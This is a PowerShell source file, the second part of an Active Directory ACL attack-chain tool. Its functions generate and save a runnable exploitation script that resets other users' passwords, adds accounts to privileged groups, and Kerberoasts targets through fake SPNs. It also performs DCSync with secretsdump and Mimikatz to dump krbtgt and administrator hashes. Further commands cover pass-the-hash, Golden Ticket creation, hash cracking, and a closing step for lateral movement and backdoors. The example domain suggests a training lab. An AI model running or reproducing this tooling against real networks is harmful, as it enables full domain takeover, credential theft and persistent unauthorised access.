# ============================================
# AD ACL ATTACK CHAIN TOOL - PART 2
# Exploitation and Reporting Functions
# ============================================

# ============================================
# FUNCTION: Show-DCSyncDetails
# ============================================
function Show-DCSyncDetails {
    [CmdletBinding()]
    param()
    
    if ($script:DCSyncFindings.Count -eq 0) {
        Write-Host "`n[*] No DCSync users found" -ForegroundColor Yellow
        return
    }
    
    Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
    Write-Host "DETAILED DCSYNC USER INFORMATION" -ForegroundColor Yellow
    Write-Host "=" * 80 -ForegroundColor Cyan
    
    foreach ($dcUser in $script:DCSyncFindings) {
        $fullUser = $dcUser.UserObject
        
        Write-Host "`n[*] USER: $($dcUser.Username)" -ForegroundColor Magenta
        Write-Host "  SID: $($fullUser.SID)" -ForegroundColor White
        Write-Host "  DN: $($fullUser.DistinguishedName)" -ForegroundColor White
        Write-Host "  Enabled: $($fullUser.Enabled)" -ForegroundColor $(if ($fullUser.Enabled) { "Green" } else { "Red" })
        Write-Host "  DCSync Rights: $($dcUser.Rights)" -ForegroundColor Red
        
        if ($dcUser.Reversible) {
            Write-Host "  [!] REVERSIBLE ENCRYPTION ENABLED - Password in cleartext!" -ForegroundColor Red -BackgroundColor Black
        }
        
        Write-Host "  Last Logon: $($fullUser.LastLogonDate)" -ForegroundColor White
        Write-Host "  Password Last Set: $($fullUser.PasswordLastSet)" -ForegroundColor White
        
        # Group memberships
        if ($fullUser.MemberOf) {
            Write-Host "  Group Memberships:" -ForegroundColor Cyan
            foreach ($groupDN in $fullUser.MemberOf) {
                $groupName = ($groupDN -split ',')[0] -replace 'CN='
                Write-Host "    - $groupName" -ForegroundColor White
            }
        }
        
        # User Account Control flags
        Write-Host "  Account Flags:" -ForegroundColor Cyan
        $uac = $fullUser.UserAccountControl
        $flags = @()
        if ($uac -band 0x0001) { $flags += "SCRIPT" }
        if ($uac -band 0x0002) { $flags += "ACCOUNTDISABLE" }
        if ($uac -band 0x0010) { $flags += "LOCKOUT" }
        if ($uac -band 0x0020) { $flags += "PASSWD_NOTREQD" }
        if ($uac -band 0x0040) { $flags += "PASSWD_CANT_CHANGE" }
        if ($uac -band 0x0080) { $flags += "ENCRYPTED_TEXT_PWD_ALLOWED" }
        if ($uac -band 0x0200) { $flags += "NORMAL_ACCOUNT" }
        if ($uac -band 0x10000) { $flags += "DONT_EXPIRE_PASSWORD" }
        if ($uac -band 0x40000) { $flags += "TRUSTED_FOR_DELEGATION" }
        if ($uac -band 0x80000) { $flags += "NOT_DELEGATED" }
        if ($uac -band 0x100000) { $flags += "USE_DES_KEY_ONLY" }
        if ($uac -band 0x200000) { $flags += "DONT_REQ_PREAUTH" }
        if ($uac -band 0x800000) { $flags += "TRUSTED_TO_AUTH_FOR_DELEGATION" }
        
        Write-Host "    $($flags -join ', ')" -ForegroundColor White
    }
}

# ============================================
# FUNCTION: Generate-ExploitationCommands
# ============================================
function Generate-ExploitationCommands {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Domain,
        
        [Parameter(Mandatory=$true)]
        [string]$StartUser
    )
    
    Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
    Write-Host "EXPLOITATION COMMANDS" -ForegroundColor Yellow
    Write-Host "=" * 80 -ForegroundColor Cyan
    
    $commands = @()
    $stepNumber = 1
    
    # === STEP 1: PASSWORD RESET ===
    if ($script:PasswordResetFindings.Count -gt 0) {
        Write-Host "`n[$stepNumber] PASSWORD RESET EXPLOITATION" -ForegroundColor Green
        
        foreach ($finding in $script:PasswordResetFindings) {
            Write-Host "`n  Target: $($finding.Target)" -ForegroundColor Yellow
            
            $cmd1 = @"
# ============================================
# STEP $stepNumber.$($script:PasswordResetFindings.IndexOf($finding) + 1): Reset Password for $($finding.Target)
# ============================================

# Create PSCredential for $($finding.Attacker)
Write-Host "[*] Creating credential for $($finding.Attacker)..." -ForegroundColor Yellow
`$SecPassword = ConvertTo-SecureString '<PASSWORD_HERE>' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('$Domain\$($finding.Attacker)', `$SecPassword)

# Create new password
`$NewPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Reset password (requires PowerView)
Write-Host "[*] Resetting password for $($finding.Target)..." -ForegroundColor Yellow
Set-DomainUserPassword -Identity $($finding.Target) -AccountPassword `$NewPassword -Credential `$Cred -Verbose

# Create credential for compromised account
Write-Host "[+] Password reset successful!" -ForegroundColor Green
`$Cred_$($finding.Target) = New-Object System.Management.Automation.PSCredential('$Domain\$($finding.Target)', `$NewPassword)

Write-Host "[+] You can now use: `$Cred_$($finding.Target)" -ForegroundColor Green
"@
            
            Write-Host $cmd1 -ForegroundColor Gray
            $commands += $cmd1
        }
        $stepNumber++
    }
    
    # === STEP 2: GROUP MEMBERSHIP ===
    if ($script:GroupWriteFindings.Count -gt 0) {
        Write-Host "`n[$stepNumber] GROUP MEMBERSHIP EXPLOITATION" -ForegroundColor Green
        
        foreach ($finding in $script:GroupWriteFindings) {
            Write-Host "`n  Group: $($finding.GroupName)" -ForegroundColor Yellow
            
            $cmd2 = @"
# ============================================
# STEP $stepNumber.$($script:GroupWriteFindings.IndexOf($finding) + 1): Add $($finding.Attacker) to $($finding.GroupName)
# ============================================

# Check current members
Write-Host "[*] Current members of $($finding.GroupName):" -ForegroundColor Yellow
Get-ADGroup -Identity "$($finding.GroupName)" -Properties * | Select-Object -ExpandProperty Members

# Add user to group (requires PowerView)
Write-Host "[*] Adding $($finding.Attacker) to $($finding.GroupName)..." -ForegroundColor Yellow
Add-DomainGroupMember -Identity '$($finding.GroupName)' -Members '$($finding.Attacker)' -Credential `$Cred_$($finding.Attacker) -Verbose

# Alternative using native AD cmdlets
# Add-ADGroupMember -Identity "$($finding.GroupName)" -Members "$($finding.Attacker)" -Credential `$Cred_$($finding.Attacker)

# Verify membership
Write-Host "[*] Verifying group membership..." -ForegroundColor Yellow
Get-DomainGroupMember -Identity "$($finding.GroupName)" | Where-Object { `$_.MemberName -eq "$($finding.Attacker)" }

Write-Host "[+] Group membership added successfully!" -ForegroundColor Green
"@
            
            Write-Host $cmd2 -ForegroundColor Gray
            $commands += $cmd2
        }
        $stepNumber++
    }
    
    # === STEP 3: KERBEROASTING ===
    if ($script:GenericAllFindings.Count -gt 0) {
        Write-Host "`n[$stepNumber] KERBEROASTING EXPLOITATION" -ForegroundColor Green
        
        foreach ($finding in $script:GenericAllFindings) {
            Write-Host "`n  Target: $($finding.TargetUser) (via $($finding.AttackerGroup))" -ForegroundColor Red
            
            $credVar = "Cred_$($finding.AttackerUser)"
            
            $cmd3 = @"
# ============================================
# STEP $stepNumber.$($script:GenericAllFindings.IndexOf($finding) + 1): Kerberoast $($finding.TargetUser)
# ============================================

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "KERBEROASTING: $($finding.TargetUser)" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan

# Step 1: Create fake SPN
Write-Host "[1] Creating fake SPN..." -ForegroundColor Yellow
Set-DomainObject -Credential `$$credVar -Identity $($finding.TargetUser) -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

Start-Sleep -Seconds 2

# Step 2: Request TGS with Rubeus
Write-Host "`n[2] Requesting Kerberos TGS..." -ForegroundColor Yellow
.\Rubeus.exe kerberoast /user:$($finding.TargetUser) /nowrap

Write-Host "`n[3] Expected output format:" -ForegroundColor Gray
Write-Host "  `$krb5tgs`$23`$*$($finding.TargetUser)`$$Domain.LOCAL`$..." -ForegroundColor DarkGray

# Alternative: Use Impacket from Linux
Write-Host "`n[4] Alternative (Impacket - automatic):" -ForegroundColor Yellow
Write-Host "  python3 targetedKerberoast.py -d $Domain.LOCAL -u $($finding.AttackerUser) -p 'Pwn3d_by_ACLs!' -t $($finding.TargetUser)" -ForegroundColor Gray

# Step 3: Crack the hash
Write-Host "`n[5] Crack with Hashcat:" -ForegroundColor Yellow
Write-Host "  hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt" -ForegroundColor Gray

Write-Host "`n[6] Or with John:" -ForegroundColor Yellow
Write-Host "  john --format=krb5tgs --wordlist=rockyou.txt hash.txt" -ForegroundColor Gray

# Step 4: Clean up
Write-Host "`n[7] Removing fake SPN..." -ForegroundColor Yellow
Set-DomainObject -Credential `$$credVar -Identity $($finding.TargetUser) -Clear serviceprincipalname -Verbose

Write-Host "`n[+] Once cracked, authenticate as $($finding.TargetUser)" -ForegroundColor Green
"@
            
            Write-Host $cmd3 -ForegroundColor Gray
            $commands += $cmd3
        }
        $stepNumber++
    }
    
    # === STEP 4: DCSYNC ===
    if ($script:DCSyncFindings.Count -gt 0) {
        Write-Host "`n[$stepNumber] DCSYNC ATTACK" -ForegroundColor Green
        
        $primaryDC = $script:DomainInfo.PrimaryDC
        
        foreach ($finding in $script:DCSyncFindings) {
            Write-Host "`n  DCSync User: $($finding.Username)" -ForegroundColor Red
            
            $cmd4 = @"
# ============================================
# STEP $stepNumber.$($script:DCSyncFindings.IndexOf($finding) + 1): DCSync with $($finding.Username)
# ============================================

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "DCSYNC ATTACK: $($finding.Username)" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan

# Prerequisite: Obtain password for $($finding.Username) first
Write-Host "[!] Note: You need credentials for $($finding.Username)" -ForegroundColor Yellow

# Method 1: Impacket secretsdump (RECOMMENDED)
Write-Host "`n[1] Full domain dump:" -ForegroundColor Yellow
Write-Host "  secretsdump.py -outputfile '$Domain`_hashes' -just-dc '$Domain/$($finding.Username)@$primaryDC'" -ForegroundColor Cyan

Write-Host "`n[2] Dump KRBTGT (for Golden Ticket):" -ForegroundColor Yellow
Write-Host "  secretsdump.py -just-dc-user krbtgt '$Domain/$($finding.Username)@$primaryDC'" -ForegroundColor Cyan

Write-Host "`n[3] Dump specific user:" -ForegroundColor Yellow
Write-Host "  secretsdump.py -just-dc-user administrator '$Domain/$($finding.Username)@$primaryDC'" -ForegroundColor Cyan

Write-Host "`n[4] With password history:" -ForegroundColor Yellow
Write-Host "  secretsdump.py -history -just-dc '$Domain/$($finding.Username)@$primaryDC'" -ForegroundColor Cyan

# Method 2: Mimikatz
Write-Host "`n[5] Using Mimikatz:" -ForegroundColor Yellow
Write-Host "  privilege::debug" -ForegroundColor Cyan
Write-Host "  lsadump::dcsync /domain:$Domain.LOCAL /user:krbtgt" -ForegroundColor Cyan
Write-Host "  lsadump::dcsync /domain:$Domain.LOCAL /user:administrator" -ForegroundColor Cyan
Write-Host "  lsadump::dcsync /domain:$Domain.LOCAL /all /csv" -ForegroundColor Cyan

# Post-exploitation
Write-Host "`n[6] After obtaining hashes:" -ForegroundColor Yellow
Write-Host "  a) Pass-the-Hash:" -ForegroundColor White
Write-Host "     pth-winexe -U administrator%NTLM_HASH //$primaryDC cmd.exe" -ForegroundColor Gray
Write-Host "  b) Create Golden Ticket:" -ForegroundColor White
Write-Host "     ticketer.py -nthash KRBTGT_HASH -domain-sid $($script:DomainInfo.DomainSID.Value) -domain $Domain administrator" -ForegroundColor Gray
Write-Host "  c) Crack hashes:" -ForegroundColor White
Write-Host "     hashcat -m 1000 hashes.txt rockyou.txt" -ForegroundColor Gray
"@
            
            if ($finding.Reversible) {
                $cmd4 += @"

Write-Host "`n[!] CRITICAL: $($finding.Username) has REVERSIBLE ENCRYPTION!" -ForegroundColor Red -BackgroundColor Black
Write-Host "    The secretsdump output will contain CLEARTEXT password!" -ForegroundColor Red
Write-Host "    Look for: $($finding.Username):CLEARTEXT:password_here" -ForegroundColor Yellow
"@
            }
            
            Write-Host $cmd4 -ForegroundColor Gray
            $commands += $cmd4
        }
        $stepNumber++
    }
    
    return $commands
}

# ============================================
# FUNCTION: Save-ExploitationScript
# ============================================
function Save-ExploitationScript {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Domain,
        
        [Parameter(Mandatory=$true)]
        [string]$StartUser,
        
        [Parameter(Mandatory=$true)]
        [array]$Commands
    )
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputFile = "ACL_Exploitation_${Domain}_${timestamp}.ps1"
    
    $header = @"
#Requires -Module ActiveDirectory
# =============================================
# AD ACL EXPLOITATION SCRIPT
# Generated: $(Get-Date)
# Domain: $Domain
# Starting User: $StartUser
# =============================================
# PREREQUISITES:
# 1. Import-Module .\PowerView.ps1
# 2. Download Rubeus.exe to current directory
# 3. Replace <PASSWORD_HERE> with actual passwords
# 4. Run steps in sequence
# =============================================

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "AD ACL EXPLOITATION - $Domain" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan

# Check for PowerView
if (-not (Get-Command Set-DomainUserPassword -ErrorAction SilentlyContinue)) {
    Write-Host "[!] PowerView not loaded. Import it first:" -ForegroundColor Red
    Write-Host "    Import-Module .\PowerView.ps1" -ForegroundColor Yellow
    exit
}

# Check for Rubeus
if (-not (Test-Path ".\Rubeus.exe")) {
    Write-Host "[!] Rubeus.exe not found in current directory" -ForegroundColor Red
    Write-Host "    Download from: https://github.com/GhostPack/Rubeus/releases" -ForegroundColor Yellow
}

"@
    
    $footer = @"

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "EXPLOITATION COMPLETE" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan

Write-Host "`n[*] NEXT STEPS:" -ForegroundColor Yellow
Write-Host "  1. Crack any Kerberoast hashes offline" -ForegroundColor White
Write-Host "  2. Use DCSync to dump domain hashes" -ForegroundColor White
Write-Host "  3. Create Golden Tickets for persistence" -ForegroundColor White
Write-Host "  4. Perform lateral movement" -ForegroundColor White
Write-Host "  5. Establish additional backdoors" -ForegroundColor White
"@
    
    $fullScript = $header + "`n`n" + ($Commands -join "`n`n") + "`n`n" + $footer
    $fullScript | Out-File $outputFile -Encoding UTF8
    
    Write-Host "`n[+] Exploitation script saved: $outputFile" -ForegroundColor Green
    
    return $outputFile
}

# ============================================
# FUNCTION: Generate-Report
# ============================================
function Generate-Report {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Domain,
        
        [Parameter(Mandatory=$true)]
        [string]$StartUser
    )
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $reportFile = "ACL_Report_${Domain}_${timestamp}.txt"
    
    $report = @"
========================================
AD ACL ATTACK CHAIN DISCOVERY REPORT
========================================
Generated: $(Get-Date)
Domain: $($script:DomainInfo.DNSRoot)
Domain DN: $($script:DomainInfo.DistinguishedName)
Domain SID: $($script:DomainInfo.DomainSID.Value)
Primary DC: $($script:DomainInfo.PrimaryDC)
Starting User: $StartUser

========================================
FINDINGS SUMMARY
========================================
Total Domain Users: $($script:AllUsers.Count)
Controlled Users: $($script:ControlledUsers.Count)
Password Reset Rights: $($script:PasswordResetFindings.Count)
Group Write Rights: $($script:GroupWriteFindings.Count)
Nested Group Chains: $($script:NestedGroupFindings.Count)
Kerberoastable Targets: $($script:GenericAllFindings.Count)
DCSync Rights: $($script:DCSyncFindings.Count)
Reversible Encryption: $($script:ReversibleUsers.Count)

========================================
ATTACK CHAIN
========================================
"@
    
    # Add password reset findings
    if ($script:PasswordResetFindings.Count -gt 0) {
        $report += "`n[PASSWORD RESET RIGHTS]`n"
        foreach ($finding in $script:PasswordResetFindings) {
            $report += "  $($finding.Attacker) -> $($finding.Target)`n"
        }
    }
    
    # Add group write findings
    if ($script:GroupWriteFindings.Count -gt 0) {
        $report += "`n[GROUP WRITE RIGHTS]`n"
        foreach ($finding in $script:GroupWriteFindings) {
            $report += "  $($finding.Attacker) -> $($finding.GroupName) ($($finding.Rights))`n"
        }
    }
    
    # Add nested groups
    if ($script:NestedGroupFindings.Count -gt 0) {
        $report += "`n[NESTED GROUPS]`n"
        foreach ($finding in $script:NestedGroupFindings) {
            $report += "  $($finding.ChildGroup) -> $($finding.ParentGroup)`n"
        }
    }
    
    # Add kerberoast targets
    if ($script:GenericAllFindings.Count -gt 0) {
        $report += "`n[KERBEROASTABLE TARGETS]`n"
        foreach ($finding in $script:GenericAllFindings) {
            $report += "  $($finding.AttackerUser) via $($finding.AttackerGroup) -> $($finding.TargetUser) ($($finding.Rights))`n"
        }
    }
    
    # Add DCSync users
    if ($script:DCSyncFindings.Count -gt 0) {
        $report += "`n[DCSYNC RIGHTS]`n"
        foreach ($finding in $script:DCSyncFindings) {
            $report += "  $($finding.Username) - $($finding.Rights)`n"
            if ($finding.Reversible) {
                $report += "    [!] REVERSIBLE ENCRYPTION ENABLED`n"
            }
        }
    }
    
    # Add reversible users
    if ($script:ReversibleUsers.Count -gt 0) {
        $report += "`n[REVERSIBLE ENCRYPTION USERS]`n"
        foreach ($user in $script:ReversibleUsers) {
            $report += "  $($user.Username) (Enabled: $($user.Enabled))`n"
        }
    }
    
    $report += "`n========================================`n"
    $report += "END OF REPORT`n"
    $report += "========================================`n"
    
    $report | Out-File $reportFile -Encoding UTF8
    
    Write-Host "`n[+] Full report saved: $reportFile" -ForegroundColor Green
    
    return $reportFile
}

# ============================================
# MAIN EXECUTION FUNCTION
# ============================================
function Start-ADACLChain {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Domain,
        
        [Parameter(Mandatory=$true)]
        [string]$StartUser
    )
    
    Write-Host @"

╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     AD ACL Attack Chain Discovery & Exploitation Tool        ║
║                       FULL EXECUTION                         ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Cyan
    
    # Initialize
    if (-not (Initialize-DomainInfo)) {
        Write-Host "[-] Failed to initialize. Exiting." -ForegroundColor Red
        return
    }
    
    # Get all users
    if (-not (Get-AllDomainUsers)) {
        Write-Host "[-] Failed to enumerate users. Exiting." -ForegroundColor Red
        return
    }
    
    # Check reversible encryption
    Test-ReversibleEncryption
    
    # Check DCSync rights
    Find-DCSync
    
    # Show DCSync details
    Show-DCSyncDetails
    
    # Enumerate start user rights
    $hasRights = Enumerate-StartUserRights -StartUser $StartUser -Domain $Domain
    
    if (-not $hasRights) {
        Write-Host "`n[-] No exploitable ACL chain found for $StartUser" -ForegroundColor Yellow
        Write-Host "[*] Generating report anyway..." -ForegroundColor Yellow
    } else {
        # Follow the chain for controlled users
        Write-Host "`n=== Following the Attack Chain ===" -ForegroundColor Cyan
        
        foreach ($controlledUser in $script:ControlledUsers) {
            Find-GroupRights -ControlledUser $controlledUser -Domain $Domain
        }
    }
    
    # Generate exploitation commands
    $commands = Generate-ExploitationCommands -Domain $Domain -StartUser $StartUser
    
    # Save exploitation script
    $scriptFile = Save-ExploitationScript -Domain $Domain -StartUser $StartUser -Commands $commands
    
    # Generate report
    $reportFile = Generate-Report -Domain $Domain -StartUser $StartUser
    
    # Cleanup
    Remove-Item "ad_users_temp.txt" -ErrorAction SilentlyContinue
    
    # Final summary
    Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
    Write-Host "EXECUTION COMPLETE" -ForegroundColor Green
    Write-Host "=" * 80 -ForegroundColor Cyan
    
    Write-Host "`n[FILES GENERATED]" -ForegroundColor Yellow
    Write-Host "  Exploitation Script: $scriptFile" -ForegroundColor Cyan
    Write-Host "  Detailed Report: $reportFile" -ForegroundColor Cyan
    
    Write-Host "`n[ATTACK CHAIN SUMMARY]" -ForegroundColor Yellow
    Write-Host "  1. $StartUser can reset $($script:PasswordResetFindings.Count) password(s)" -ForegroundColor White
    Write-Host "  2. $StartUser controls $($script:ControlledUsers.Count) user(s)" -ForegroundColor White
    Write-Host "  3. $($script:GroupWriteFindings.Count) group(s) can be compromised" -ForegroundColor White
    Write-Host "  4. $($script:GenericAllFindings.Count) user(s) can be Kerberoasted" -ForegroundColor White
    Write-Host "  5. $($script:DCSyncFindings.Count) user(s) have DCSync rights" -ForegroundColor White
    
    Write-Host "`n[NEXT ACTION]" -ForegroundColor Yellow
    Write-Host "  Execute: .\$scriptFile" -ForegroundColor Cyan
    Write-Host "  (Remember to replace <PASSWORD_HERE> with actual passwords)" -ForegroundColor DarkGray
}

# ============================================
# INTERACTIVE MODE
# ============================================
if (-not $Domain -or -not $StartUser) {
    Write-Host "`n=== Interactive Mode ===" -ForegroundColor Cyan
    $Domain = Read-Host "Enter domain (e.g., INLANEFREIGHT)"
    $StartUser = Read-Host "Enter starting username (e.g., wley)"
}

# Execute main function
Start-ADACLChain -Domain $Domain -StartUser $StartUser

Write-Host "`n[+] Tool execution complete!" -ForegroundColor Green
